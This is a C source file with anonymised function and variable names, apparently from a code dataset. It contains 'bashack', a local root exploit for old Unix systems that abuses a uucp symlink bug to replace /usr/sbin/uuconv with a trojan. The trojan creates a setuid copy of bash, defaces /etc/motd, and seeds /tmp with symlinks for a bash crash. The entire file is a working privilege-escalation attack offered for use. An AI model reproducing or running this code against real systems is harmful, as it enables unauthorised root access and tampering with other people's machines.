
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 char* VAR_0 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int *) ;
 int * FUNC_2 (char*,char*) ;
 int FUNC_3 (int *,char*,...) ;
 char* FUNC_4 (char*) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (char*,char*,...) ;
 int FUNC_8 (char*,char*) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*) ;

FUNC_11()
{
 int VAR_1;
  char VAR_2[2000];
  char *VAR_3;
  FILE *VAR_4;
  FUNC_6("bashack - root using multiple config/input validation errors\n\n");
  FUNC_6("creating trojan in /usr/sbin/uuconv\n");
  FUNC_6("                 - uucp bug -\n");
  FUNC_6("uucp follows symlinks as euid=uucp, (uid,gid,egid=you)\n\n");
  VAR_3=FUNC_4("HOME");
  FUNC_7(VAR_2,"%s/bashacker/",VAR_3);
  FUNC_5(VAR_2);
  FUNC_0(VAR_2);
  FUNC_7(VAR_2,"%s/bashacker/bashaker",VAR_3);
  FUNC_10(VAR_2);
  FUNC_6("== uuconv replacement\n");
  FUNC_6("* making uuconv.c\n");
  FUNC_7(VAR_2,"%s/bashacker/uuconv.c",VAR_3);
  VAR_4=FUNC_2(VAR_2,"w");
  FUNC_7(VAR_2,"%s/bashacker",VAR_3);
  FUNC_3(VAR_4,"main()\n{\n");
  FUNC_3(VAR_4,"printf(\"sendmail\n\");\n");
  FUNC_3(VAR_4,"system(\"/bin/cp /bin/bash %s/bashacker;",VAR_2);
  FUNC_3(VAR_4,"/bin/chmod 6711 %s/bashacker;",VAR_2);
  FUNC_3(VAR_4,"echo hacked by %s>>/etc/motd;",FUNC_4("LOGNAME"));
  FUNC_3(VAR_4,"echo -n \\\"at about \\\" >>/etc/motd; /bin/date >>/etc/motd");
  FUNC_3(VAR_4,"\");\n");
  FUNC_3(VAR_4,"}\n");
  FUNC_1(VAR_4);
  FUNC_6("* compiling ./uuconv.c ==> ./uuconv \n");
  FUNC_9("cc -o uuconv uuconv.c -O2;strip uuconv");
  FUNC_10("/var/spool/uucppublic/uuconv");
  FUNC_8("/usr/sbin/uuconv","/var/spool/uucppublic/uuconv");
  FUNC_6("* copying to /usr/sbin via uucp bug\n");
  FUNC_7(VAR_2,
  "/usr/bin/uucp %s/bashacker/uuconv /var/spool/uucppublic/uuconv",VAR_3);
  FUNC_9(VAR_2);
  FUNC_6("== cleaning up a little.\n");
  FUNC_10("/var/spool/uucppublic/uuconv");
  FUNC_10("uuconv");
  FUNC_10("uuconv.c");
  FUNC_6("== set up /tmp for bash part of exploit.\n");
  for(VAR_1=100;VAR_1<150;VAR_1++)





  {
  FUNC_7(VAR_2,"/tmp/t%d-sh",VAR_1);
  FUNC_10(VAR_2);
  FUNC_8(VAR_0,VAR_2);
  }
  FUNC_6("* my work here is done.\n\n");
  FUNC_6("now pray for some kinda of crash.\n\n\t--zen\n");
}
